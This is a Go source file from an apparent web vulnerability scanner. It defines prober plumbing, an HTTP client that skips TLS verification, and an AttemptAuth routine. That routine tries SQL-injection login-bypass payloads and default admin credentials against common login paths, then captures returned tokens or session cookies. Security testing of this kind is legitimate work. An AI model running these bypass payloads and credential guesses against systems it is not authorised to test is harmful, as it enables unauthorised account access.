package probers

import (
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// Prober is the interface that all technique-specific probers implement.
type Prober interface {
	Name() string
	Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding
}

// ProberConfig holds shared configuration for probers.
type ProberConfig struct {
	BaseURL         string
	AuthToken       string // JWT or session token for authenticated scanning
	Client          *http.Client
	BaseFingerprint string // SHA256 prefix of base URL response (SPA detection)
	Classified      *types.ClassifiedEndpoints
}

// NewProberConfig creates a ProberConfig from a target.
func NewProberConfig(target types.Target) *ProberConfig {
	cfg := &ProberConfig{
		BaseURL:   strings.TrimRight(target.URL, "/"),
		AuthToken: target.Headers["Authorization"],
		Client: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
	// Fingerprint the base URL for SPA detection
	cfg.BaseFingerprint = cfg.fingerprintURL(cfg.BaseURL)
	return cfg
}

// NewProberConfigWithClassified creates a ProberConfig with classified endpoints.
func NewProberConfigWithClassified(target types.Target, classified *types.ClassifiedEndpoints) *ProberConfig {
	cfg := NewProberConfig(target)
	cfg.Classified = classified
	return cfg
}

// fingerprintURL returns a hash prefix of the response body.
func (c *ProberConfig) fingerprintURL(url string) string {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return ""
	}
	resp, err := c.Client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	h := sha256.Sum256(body)
	return fmt.Sprintf("%x", h[:8])
}

// IsSPAResponse checks if a URL returns the same response as the base SPA page.
// If true, it's a SPA catch-all route, NOT a real file/endpoint.
func (c *ProberConfig) IsSPAResponse(url string) bool {
	if c.BaseFingerprint == "" {
		return false
	}
	fp := c.fingerprintURL(url)
	return fp == c.BaseFingerprint
}

// DoRequest sends an HTTP request and returns status, headers, and body.
func (c *ProberConfig) DoRequest(method, url string, body io.Reader, headers map[string]string) (int, http.Header, string, error) {
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return 0, nil, "", err
	}
	if c.AuthToken != "" {
		req.Header.Set("Authorization", c.AuthToken)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := c.Client.Do(req)
	if err != nil {
		return 0, nil, "", err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	return resp.StatusCode, resp.Header, string(respBody), nil
}

// DoRequestRaw sends a request and returns the raw response.
func (c *ProberConfig) DoRequestRaw(method, url string, body io.Reader, headers map[string]string) (*http.Response, error) {
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}
	if c.AuthToken != "" {
		req.Header.Set("Authorization", c.AuthToken)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	return c.Client.Do(req)
}

// MakeFinding is a helper to create a finding with common fields.
func MakeFinding(title, severity, desc, endpoint, method, cwe, poc, evidence, technique string, loop int) types.Finding {
	sev, _ := types.ParseSeverity(severity)
	f := types.Finding{
		Title:       title,
		Description: desc,
		Severity:    sev,
		Endpoint:    endpoint,
		Method:      method,
		CWE:         cwe,
		PoC:         poc,
		Evidence:    evidence,
		Technique:   technique,
		Confirmed:   true,
		FoundAt:     time.Now(),
		Loop:        loop,
	}
	f.ID = f.Signature()
	return f
}

// AllProbers returns all registered probers.
func AllProbers() []Prober {
	return []Prober{
		&SQLiProber{},
		&XSSProber{},
		&IDORProber{},
		&AuthProber{},
		&InfoLeakProber{},
		&InjectionProber{},
		&HeadersProber{},
		&FileUploadProber{},
		&SSRFProber{},
		&CryptoProber{},
		&AdditionalProber{},
	}
}

// RunAllProbers runs every prober against the target and returns combined findings.
func RunAllProbers(ctx context.Context, target types.Target, endpoints []types.Endpoint, classified *types.ClassifiedEndpoints, loop int) []types.Finding {
	// Store classified endpoints in target headers for probers to access via config
	var all []types.Finding
	for _, p := range AllProbers() {
		select {
		case <-ctx.Done():
			return all
		default:
		}
		findings := p.Probe(ctx, target, endpoints)
		for i := range findings {
			findings[i].Loop = loop
			findings[i].ID = findings[i].Signature()
		}
		all = append(all, findings...)
	}
	return all
}

// SetClassifiedEndpoints stores the classified endpoints in a package-level
// variable so probers can access them. This avoids changing the Prober interface.
var currentClassified *types.ClassifiedEndpoints

// RunAllProbersWithClassified runs all probers with classified endpoint context.
func RunAllProbersWithClassified(ctx context.Context, target types.Target, endpoints []types.Endpoint, classified *types.ClassifiedEndpoints, loop int) []types.Finding {
	currentClassified = classified
	defer func() { currentClassified = nil }()
	return RunAllProbers(ctx, target, endpoints, classified, loop)
}

// AttemptAuth tries to authenticate against the target using discovered login endpoints.
// It tries SQLi bypass, default credentials, and common auth patterns.
// Returns the auth token/header value, or empty string if auth fails.
func AttemptAuth(baseURL string, classified *types.ClassifiedEndpoints) (string, error) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	base := strings.TrimRight(baseURL, "/")

	// Collect login endpoints from classifier + common fallbacks
	loginURLs := make([]string, 0)
	if classified != nil {
		for _, ep := range classified.Login {
			loginURLs = append(loginURLs, ep.URL)
		}
	}
	// Always try common login paths as fallback
	commonLoginPaths := []string{"/login", "/api/login", "/auth/login", "/api/auth/login",
		"/rest/user/login", "/signin", "/api/signin", "/api/Users/login",
		"/oauth/token", "/api/authenticate"}
	for _, p := range commonLoginPaths {
		u := base + p
		found := false
		for _, existing := range loginURLs {
			if existing == u {
				found = true
				break
			}
		}
		if !found {
			loginURLs = append(loginURLs, u)
		}
	}

	// Phase 1: SQLi bypass payloads (JSON format)
	sqliPayloads := []string{
		`{"email":"' OR 1=1--","password":"anything"}`,
		`{"username":"' OR 1=1--","password":"anything"}`,
		`{"email":"admin'--","password":"anything"}`,
		`{"username":"admin'--","password":"anything"}`,
		`{"email":"' OR '1'='1'--","password":"anything"}`,
	}

	// Phase 2: Default credentials
	defaultCreds := []string{
		`{"email":"admin@admin.com","password":"admin"}`,
		`{"username":"admin","password":"admin"}`,
		`{"email":"admin@admin.com","password":"password"}`,
		`{"username":"admin","password":"password"}`,
		`{"email":"admin@admin.com","password":"admin123"}`,
		`{"username":"admin","password":"admin123"}`,
		`{"email":"test@test.com","password":"test"}`,
		`{"username":"test","password":"test"}`,
	}

	allPayloads := append(sqliPayloads, defaultCreds...)

	for _, loginURL := range loginURLs {
		for _, payload := range allPayloads {
			resp, err := client.Post(loginURL, "application/json", strings.NewReader(payload))
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			if resp.StatusCode != 200 {
				continue
			}

			bodyStr := string(body)

			// Try to extract token from JSON response
			token := extractAuthToken(bodyStr)
			if token != "" {
				return "Bearer " + token, nil
			}

			// Check Set-Cookie header for session tokens
			cookies := resp.Header.Values("Set-Cookie")
			if len(cookies) > 0 {
				// Return the session cookie as auth
				for _, c := range cookies {
					if strings.Contains(strings.ToLower(c), "session") ||
						strings.Contains(strings.ToLower(c), "token") ||
						strings.Contains(strings.ToLower(c), "auth") {
						return "Cookie:" + c, nil
					}
				}
			}
		}

		// Phase 3: Try form-encoded login
		formPayloads := []url.Values{
			{"username": {"admin"}, "password": {"admin"}},
			{"email": {"admin@admin.com"}, "password": {"admin"}},
			{"username": {"' OR 1=1--"}, "password": {"anything"}},
			{"email": {"' OR 1=1--"}, "password": {"anything"}},
		}

		for _, form := range formPayloads {
			resp, err := client.PostForm(loginURL, form)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			if resp.StatusCode != 200 {
				continue
			}

			bodyStr := string(body)
			token := extractAuthToken(bodyStr)
			if token != "" {
				return "Bearer " + token, nil
			}

			cookies := resp.Header.Values("Set-Cookie")
			for _, c := range cookies {
				if strings.Contains(strings.ToLower(c), "session") ||
					strings.Contains(strings.ToLower(c), "token") ||
					strings.Contains(strings.ToLower(c), "auth") {
					return "Cookie:" + c, nil
				}
			}
		}
	}

	return "", fmt.Errorf("authentication failed against %d login endpoints", len(loginURLs))
}

// extractAuthToken tries to find a JWT or auth token in a JSON response body.
func extractAuthToken(body string) string {
	// Try common JSON token field names
	tokenFields := []string{"token", "access_token", "accessToken", "jwt",
		"id_token", "auth_token", "authToken", "session_token", "sessionToken"}

	// Quick JSON parse
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		// Try to find token with string scanning as fallback
		for _, field := range tokenFields {
			pattern := fmt.Sprintf(`"%s":"`, field)
			if idx := strings.Index(body, pattern); idx >= 0 {
				start := idx + len(pattern)
				end := strings.Index(body[start:], `"`)
				if end > 0 {
					token := body[start : start+end]
					if len(token) > 10 { // reasonable token length
						return token
					}
				}
			}
		}
		return ""
	}

	// Search top-level and one level deep (e.g., {"authentication":{"token":"..."}})
	for _, field := range tokenFields {
		if val, ok := data[field]; ok {
			if s, ok := val.(string); ok && len(s) > 10 {
				return s
			}
		}
	}

	// Check nested objects
	for _, val := range data {
		if nested, ok := val.(map[string]interface{}); ok {
			for _, field := range tokenFields {
				if v, ok := nested[field]; ok {
					if s, ok := v.(string); ok && len(s) > 10 {
						return s
					}
				}
			}
		}
	}

	return ""
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func extractPath(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	return u.Path
}
